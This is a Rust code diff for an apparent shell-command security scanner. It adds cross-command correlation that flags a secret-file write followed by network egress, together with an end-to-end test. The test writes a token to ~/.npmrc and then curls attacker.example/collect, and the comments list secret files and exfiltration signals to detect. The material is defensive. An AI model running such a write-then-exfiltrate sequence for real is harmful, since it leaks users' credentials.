@@ -548,10 +548,54 @@ pub fn post_process_verdict(
     // command shape + finalized findings; the deriver only emits for clear,
     // security-relevant signals (network egress, secret-file write, force-push,
     // file delete, package install, pipe-to-shell), so a clean `ls`/`cd` with no
-    // findings records nothing. Best-effort, off the hot path, never alters the
-    // verdict.
+    // findings records nothing. Best-effort, off the hot path.
+    let mut recorded_event = false;
     for event in derive_typed_events(cmd, &effective) {
         crate::session_warnings::record_typed_event(session_id, event);
+        recorded_event = true;
+    }
+
+    // W7: consume the ring. Run cross-event correlation over the events recorded
+    // so far this session and surface any FRESH hit (de-duplicated inside
+    // `correlate_session`) as a finding. Only runs when THIS command recorded a
+    // new event: a command that records nothing cannot complete a new sequence
+    // (the ring is unchanged since the last command, and any hit it would produce
+    // was already surfaced when that latest event landed), and skipping avoids a
+    // session-file write for every benign command. A hit recorded on a prior
+    // command does NOT re-emit here. Each hit's rule is routed through the policy
+    // `severity_overrides` levers (URL allowlist/blocklist do not apply: these
+    // synthetic findings carry no URL evidence), then the action is RE-DERIVED
+    // upward so a CRITICAL correlation escalates the verdict (it never downgrades
+    // an action already set above the correlation's level).
+    let correlation_hits = if recorded_event {
+        crate::session_warnings::correlate_session(session_id)
+    } else {
+        Vec::new()
+    };
+    if !correlation_hits.is_empty() {
+        for hit in correlation_hits {
+            let mut severity = hit.severity;
+            if let Some(override_sev) = policy.severity_override(&hit.rule_id) {
+                severity = override_sev;
+            }
+            effective.findings.push(Finding {
+                rule_id: hit.rule_id,
+                severity,
+                title: hit.title,
+                description: hit.description.clone(),
+                evidence: vec![Evidence::Text {
+                    detail: hit.description,
+                }],
+                human_view: None,
+                agent_view: None,
+                mitre_id: None,
+                custom_rule_id: None,
+            });
+        }
+        // Re-derive the action from the augmented finding set, only ever raising
+        // it (a correlation must never weaken an existing Block/Warn).
+        effective.action =
+            crate::verdict::upgraded_action_from_findings(&effective.findings, effective.action);
     }
 
     effective
@@ -568,18 +612,20 @@ pub fn post_process_verdict(
 /// where noted). A write target is the redirection (`> path`), downloader output
 /// flag (`-o`/`--output`), or `cp`/`mv`/`tee`/`install` destination:
 /// - `curl` / `wget` / `http` / `https` / `xh` leader, OR any network-class
-///   finding (pipe-to-shell, plain-http, schemeless, data-exfil) -> `Network`
+///   finding (pipe-to-shell, plain-http, schemeless, data-exfil,
+///   metadata-endpoint, private-network-access; must stay in sync with the
+///   `has_network_finding` match below) -> `Network`
 /// - a pipe-to-shell finding -> `ShellPipe`
 /// - a write whose target is a secret file (`.env`, `id_rsa`, `.npmrc`,
 ///   `.pypirc`, `credentials`, ...) -> `SecretWrite`
 /// - a write whose target is a dependency manifest (`package.json`,
 ///   `Cargo.toml`, a lockfile, ...) -> `FileWrite` (with the manifest metadata
 ///   flag set, so the dependency-change correlation can match it)
-/// - `git push --force` / `-f` -> `GitForcePush`
+/// - `git push` with `--force`, `-f`, or `--force-with-lease` -> `GitForcePush`
 /// - `rm` / `unlink` / `shred` with a path argument -> `FileDelete` (path in
 ///   metadata)
-/// - `npm` / `pip` / `pip3` / `cargo` / `brew` / `yarn` / `pnpm` install ->
-///   `PackageInstall`
+/// - `npm` / `pnpm` / `yarn` / `pip` / `pip3` / `cargo` / `brew` / `gem` / `go`
+///   / `apt` / `apt-get` install -> `PackageInstall`
 ///
 /// Deferred (NOT wired here): `ProcessExec` (too broad to be a useful
 /// correlation signal on its own), and `FileWrite` for ORDINARY (non-secret,
@@ -634,10 +680,6 @@ fn derive_typed_events(cmd: &str, verdict: &Verdict) -> Vec<TypedEvent> {
                 | RuleId::PrivateNetworkAccess
         )
     });
-    // Hosts already extracted from finding evidence, for Network metadata.
-    let finding_hosts =
-        crate::session_warnings::extract_domains_from_evidence(&collect_evidence(verdict));
-
     if has_pipe_to_shell {
         push(
             &mut events,
@@ -692,6 +734,11 @@ fn derive_typed_events(cmd: &str, verdict: &Verdict) -> Vec<TypedEvent> {
     }
 
     if has_network_finding || leader_is_network {
+        // Extract hosts from finding evidence lazily, only when a Network event
+        // is actually emitted, so a benign command with non-network findings
+        // does not pay the evidence clone + host scan.
+        let finding_hosts =
+            crate::session_warnings::extract_domains_from_evidence(&collect_evidence(verdict));
         let mut meta = BTreeMap::new();
         if let Some(host) = finding_hosts.first() {
             meta.insert("host".to_string(), host.clone());
@@ -971,6 +1018,7 @@ mod tests {
             hidden_events: std::collections::VecDeque::new(),
             cooldowns: std::collections::BTreeMap::new(),
             typed_events: std::collections::VecDeque::new(),
+            surfaced_correlations: std::collections::VecDeque::new(),
         }
     }
 
@@ -1974,5 +2022,111 @@ mod tests {
         assert!(
             !kinds(&derive_typed_events("npm run build", &v)).contains(&EventKind::PackageInstall)
         );
+    }
+
+    // --- W7 end-to-end: two commands through post_process_verdict correlate ---
+
+    /// Drive a secret-file write then a network command through the REAL
+    /// `post_process_verdict` against one shared session id, and assert the
+    /// `SecretWriteThenNetwork` correlation reaches the final verdict (and
+    /// escalates the action to Block). This exercises the wired path
+    /// derive_typed_events -> record_typed_event -> ring persist -> correlate_session
+    /// -> synthesized finding, which the pure `correlate` unit tests do not cover.
+    #[cfg(unix)]
+    #[test]
+    fn correlation_secret_write_then_network_reaches_verdict() {
+        let _guard = crate::TEST_ENV_LOCK
+            .lock()
+            .unwrap_or_else(|e| e.into_inner());
+        let dir = tempfile::tempdir().unwrap();
+        // SAFETY: serialized by TEST_ENV_LOCK across all modules.
+        unsafe {
+            std::env::set_var("XDG_STATE_HOME", dir.path());
+            std::env::set_var("TIRITH_LOG", "0");
+        }
+
+        let result = std::panic::catch_unwind(|| {
+            let policy = crate::policy::Policy::default();
+            let session_id = "w7-secret-then-network";
+
+            // Command 1: write a secret file (no findings needed; the deriver
+            // records a SecretWrite from the redirection target).
+            let v1 = raw_verdict_with(Action::Allow, vec![], None);
+            let out1 = post_process_verdict(
+                &v1,
+                &policy,
+                "printf 'TOKEN=x' > ~/.npmrc",
+                session_id,
+                CallerContext::Cli,
+            );
+            // The secret write alone produces no correlation yet.
+            assert!(
+                !out1
+                    .findings
+                    .iter()
+                    .any(|f| f.rule_id == RuleId::SecretWriteThenNetwork),
+                "no correlation should fire on the first command alone"
+            );
+
+            // Ensure a strictly-later instant so the network event is "after" the
+            // secret write (the correlation uses a strict `>` boundary).
+            std::thread::sleep(std::time::Duration::from_millis(5));
+
+            // Command 2: a network egress within the 30s window.
+            let v2 = raw_verdict_with(Action::Allow, vec![], None);
+            let out2 = post_process_verdict(
+                &v2,
+                &policy,
+                "curl https://attacker.example/collect",
+                session_id,
+                CallerContext::Cli,
+            );
+
+            // The correlation finding must now be present AND have escalated the
+            // verdict to Block (it is Critical).
+            assert!(
+                out2.findings
+                    .iter()
+                    .any(|f| f.rule_id == RuleId::SecretWriteThenNetwork),
+                "SecretWriteThenNetwork must reach the final verdict: {:?}",
+                out2.findings.iter().map(|f| f.rule_id).collect::<Vec<_>>()
+            );
+            assert_eq!(
+                out2.action,
+                Action::Block,
+                "a Critical correlation must escalate the action to Block"
+            );
+
+            // Dedup: a THIRD command that ALSO records a network event (so
+            // correlation runs again) must NOT re-emit the same hit. The
+            // `secret_then_network` pair resolves to the earliest secret + the
+            // FIRST following network (command 2's), so its signature is
+            // unchanged and the surfaced-marker filters it out.
+            std::thread::sleep(std::time::Duration::from_millis(5));
+            let v3 = raw_verdict_with(Action::Allow, vec![], None);
+            let out3 = post_process_verdict(
+                &v3,
+                &policy,
+                "curl https://other.example/ping",
+                session_id,
+                CallerContext::Cli,
+            );
+            assert!(
+                !out3
+                    .findings
+                    .iter()
+                    .any(|f| f.rule_id == RuleId::SecretWriteThenNetwork),
+                "an already-surfaced correlation must not re-emit on a later command"
+            );
+        });
+
+        // SAFETY: serialized by TEST_ENV_LOCK; restore regardless of outcome.
+        unsafe {
+            std::env::remove_var("XDG_STATE_HOME");
+            std::env::remove_var("TIRITH_LOG");
+        }
+        if let Err(e) = result {
+            std::panic::resume_unwind(e);
+        }
     }
 }
